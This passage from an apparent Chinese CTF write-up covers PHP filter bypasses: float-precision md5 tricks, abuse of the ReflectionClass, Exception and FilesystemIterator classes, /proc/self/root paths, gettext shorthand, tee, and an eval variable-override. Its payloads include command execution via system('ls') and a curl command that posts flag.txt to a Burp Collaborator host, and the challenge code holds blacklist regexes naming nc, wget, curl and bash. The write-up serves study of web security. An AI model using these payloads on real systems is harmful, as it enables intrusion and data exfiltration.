<p>值得一提的是我在本地测试的时候由于www-data用户没有创建文件的权限，因此复现不了，解决方法是创建一个文件夹给予所有权限然文件在里面运行即可。</p>
</blockquote>
<br/>

<h2 id="PHP精度绕过缺陷"><a href="#PHP精度绕过缺陷" class="headerlink" title="PHP精度绕过缺陷"></a>PHP精度绕过缺陷</h2><h3 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h3><p>在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210511115448.png" alt="image-20210511114413456"></p>
<p>输出的是57，而我们预想的应该是58。简单的说因为PHP 通常使用 IEEE 754 双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为 <code>1.11e-16</code>,当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> (<span class="number">1.0000000000001</span>); <span class="comment">//13位小数 输出：10000000000001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="number">1.0000000000000001</span>); <span class="comment">//16位小数 输出：1</span></span><br></pre></td></tr></table></figure>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$</span><br><span class="line"><span class="keyword">if</span>(md5(trick1) === md5(trick2) &amp;&amp; trick1 == trick2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;successs!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题是考察<strong>浮点数精度问题导致的大小比较以及函数处理问题</strong>，当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">1.0000000000000001</span> == <span class="number">1</span>) &gt;&gt; <span class="literal">TRUE</span></span><br><span class="line">var_dump(<span class="number">1.0000000000000001</span> === <span class="number">1</span>) &gt;&gt; <span class="literal">FALSE</span></span><br></pre></td></tr></table></figure>
<p><code>0.9999999999999999</code>（<strong>17个9</strong>）经过<code>strlen</code>函数会判断为1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">0.99999999999999999</span> == <span class="number">1</span> );  &gt;&gt; <span class="literal">TRUE</span></span><br><span class="line">var_dump(<span class="number">0.99999999999999999</span> === <span class="number">1</span> );  &gt;&gt; <span class="literal">FALSE</span></span><br></pre></td></tr></table></figure>
<p>最后看一下md5函数处理后是否相同</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(<span class="number">0.99999999999999999</span>) == md5(<span class="number">1</span>) );  &gt;&gt; <span class="literal">TRUE</span></span><br><span class="line">var_dump(md5(<span class="number">0.99999999999999999</span>) === md5(<span class="number">1</span>) );  &gt;&gt; <span class="literal">TRUE</span></span><br></pre></td></tr></table></figure>
<p>因此当我们输入<code>trick1=1</code>和<code>trick2=0.99999999999999999</code>能满足题目中在弱比较中是相等的，而且md5的强比较也是相等。</p>
<br/>

<h2 id="PHP中类的运用"><a href="#PHP中类的运用" class="headerlink" title="PHP中类的运用"></a>PHP中类的运用</h2><h3 id="反射类ReflectionClass"><a href="#反射类ReflectionClass" class="headerlink" title="反射类ReflectionClass"></a>反射类ReflectionClass</h3><p>首先看一下反射类的用法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fuc</span> </span>&#123; <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ec</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;我是一个类&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$class</span>=<span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;fuc&#x27;</span>); <span class="comment">//建立 fuc这个类的反射类</span></span><br><span class="line"><span class="variable">$fuc</span>=<span class="variable">$class</span>-&gt;newInstance(); <span class="comment">//相当于实例化 fuc 类</span></span><br><span class="line"><span class="variable">$fuc</span>-&gt;ec(); <span class="comment">//执行 fuc 里的方法ec</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*最后输出:我是一个类*/</span></span><br><span class="line"><span class="comment">#还有其他用法</span></span><br><span class="line"><span class="variable">$ec</span>=<span class="variable">$class</span>-&gt;getmethod(<span class="string">&#x27;ec&#x27;</span>); <span class="comment">//获取fuc类中的ec方法</span></span><br><span class="line"><span class="variable">$fuc</span>=<span class="variable">$class</span>-&gt;newInstance(); <span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$ec</span>-&gt;invoke(<span class="variable">$fuc</span>);   <span class="comment">//执行ec方法</span></span><br></pre></td></tr></table></figure>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这一部分的类由其他文件引入，用户不可见</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aurora</span> </span>&#123; <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag_is_Aurora</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是用户可见部分</span></span><br><span class="line"><span class="variable">$aurora</span> = <span class="keyword">new</span> aurora();</span><br><span class="line"><span class="comment">//flag is in class aurora</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span> = is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$v0</span>) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;aurora&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure>
<p>输入一个数字和两个字符让<code>$v0</code>的值为TURE，然后构造<code>eval()</code>函数里面执行的命令为<code>eval(echo new ReflectionClass(&#39;aurora&#39;);)</code>，执行的结果如下图：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210511151455.png" alt="image-20210511151216348"></p>
<p>把类里面属性和方法的名字都能够显示出来。</p>
<h3 id="异常处理类Exception"><a href="#异常处理类Exception" class="headerlink" title="异常处理类Exception"></a>异常处理类Exception</h3><p>先简单了解一下PHP异常处理</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210511152050.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个有异常处理的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNum</span>(<span class="params"><span class="variable">$number</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$number</span>&gt;<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;变量值必须小于等于 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 try 块 触发异常</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    checkNum(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 如果抛出异常，以下文本不会输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;如果输出该内容，说明 $number 变量&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 捕获异常</span></span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Message: &#x27;</span> .<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码将得到类似这样一个错误：Message: 变量值必须小于等于 1</p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里看似用正则把不是字母的字符串都过滤了，实际上这里的正则没写好，只要第一个字符是字母即可绕过。这里可以直接new一个Exception运行我们想要的命令就可以把内容回显出来。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
<br/>

<h3 id="内置类FilesystemIterator"><a href="#内置类FilesystemIterator" class="headerlink" title="内置类FilesystemIterator"></a>内置类FilesystemIterator</h3><p>PHP使用FilesystemIterator迭代器遍历目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$a</span>-&gt;valid()) &#123;	<span class="comment">//判断是否到底</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;getFilename().<span class="string">&quot;\n&quot;</span>;	<span class="comment">//输出文件或者文件夹</span></span><br><span class="line">    <span class="variable">$a</span>-&gt;next();	 <span class="comment">//指针移向下一个</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样会把当前文件夹里面所有的文件和目录都输出出来。</p>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcwd ( ) : <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p> 成功则返回当前工作目录，失败返回 **<code>false</code>**。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</span><br></pre></td></tr></table></figure>
<p>会显示当前文件夹中的最后一个文件。</p>
<br/>

<h2 id="proc-self-root绕过is-file函数"><a href="#proc-self-root绕过is-file函数" class="headerlink" title="/proc/self/root绕过is_file函数"></a>/proc/self/root绕过is_file函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_file ( <span class="keyword">string</span> <span class="variable">$filename</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>判断给定文件名是否为一个正常的文件。</p>
<p>在linux中<code>/proc/self/root</code>是指向根目录的，将<code>/proc/self/root</code>重复一定次数就可以绕过<code>is_file()</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;p</span><br><span class="line">roc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro</span><br><span class="line">c&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;</span><br><span class="line">self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;se</span><br><span class="line">lf&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;flag</span><br></pre></td></tr></table></figure>
<p>当然这里也有其他的绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;&#x2F;flag</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="gettext-amp-get-defined-vars函数"><a href="#gettext-amp-get-defined-vars函数" class="headerlink" title="gettext&amp;get_defined_vars函数"></a>gettext&amp;get_defined_vars函数</h2><p>php的扩展gettext实现程序的国际化</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210511215324.png" alt="image-20210511215233675"></p>
<p><code>_()是gettext()</code>函数的简写形式，能够利用这点绕过字符的限制。</p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;success!&quot;</span>; </span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>)) &#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>, <span class="variable">$f2</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span> ,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( <span class="keyword">callable</span> <span class="variable">$callback</span> , mixed <span class="variable">$parameter</span> = ? , mixed $... = ? ) : mixed</span><br></pre></td></tr></table></figure>
<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>
<p>那既然变量<code>$f1</code>过滤数字和字母，就可以使用该符号来代替这个函数，这样便可以绕过第一个嵌套，然后再由最外面的<code>call_user_func()</code>执行命令</p>
<ol>
<li>第一步</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(call_user_func(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;phpinfo&#x27;</span>))  &gt;&gt; call_user_func(_(<span class="string">&#x27;phpinfo&#x27;</span>))</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>第二步</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(_(<span class="string">&#x27;phpinfo&#x27;</span>)) &gt;&gt; call_user_func(<span class="string">&#x27;phpinfo&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>第三步</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">&#x27;phpinfo&#x27;</span>) &gt;&gt; phpinfo()</span><br></pre></td></tr></table></figure>
<p>最后就能够把PHP的配置信息显示出来。</p>
<br/>

<h2 id="Linux-tee命令"><a href="#Linux-tee命令" class="headerlink" title="Linux tee命令"></a>Linux tee命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee [参数] [文件]</span><br></pre></td></tr></table></figure>
<p><code>tee</code>命令主要被用来向standout(标准输出流，通常是命令执行窗口）输出的同时也将内容输出到文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tee file1 file2  //将输入的内容覆盖到这两个文件里面</span><br><span class="line">ls|tee 1.txt  //将ls命令的输出显示并保存到1.txt文件中</span><br></pre></td></tr></table></figure>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>由于这里使用的是<code>exec()</code>函数执行命令，结果并不会回显，因此这里我们需要把想要获取的内容写入到文件里面，再访问这个文件。用黑名单过滤了<code>&gt;</code>，因此无法写入文件，过滤<code>php</code>，也就无法写入一句话木马，但是可以利用<code>tee</code>命令将其他命令返回的结果写入到文件中，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;cat &#x2F;flag|tee tmp</span><br></pre></td></tr></table></figure>
<p>然后访问tmp即可。</p>
<br/>

<h2 id="传参变量覆盖"><a href="#传参变量覆盖" class="headerlink" title="传参变量覆盖"></a>传参变量覆盖</h2><p>假设有这么一段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$F</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(substr(<span class="variable">$F</span>, <span class="number">0</span>, <span class="number">5</span>));</span><br></pre></td></tr></table></figure>
<p>当我们传的参数是<code>$F</code>本身，就会出现变量覆盖：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F&#x3D;&#96;$F&#96;;sleep 5</span><br></pre></td></tr></table></figure>
<ol>
<li>首先是经过<code>substr()</code>函数</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(substr(<span class="variable">$F</span>, <span class="number">0</span>, <span class="number">5</span>));	&gt;&gt;	<span class="keyword">eval</span>(`<span class="variable">$F</span>`;);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>然后是反引号执行</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(`<span class="variable">$F</span>`;);	&gt;&gt;	<span class="keyword">eval</span>(`<span class="variable">$F</span>`;sleep <span class="number">5</span>;);</span><br></pre></td></tr></table></figure>
<p>执行后会休眠5秒。</p>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里curl命令没有被过滤。可以借此来把文件内容外带出来。这里还要用到Burp 的Collaborator client。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F&#x3D;&#96;$F &#96;;curl -X POST -F test&#x3D;@flag.txt 5jpx4t2xg6r9iyulvgaypqw37udk19.burpcollaborator.net</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210512111833.png" alt="image-20210512111833668"></p>
<br/>

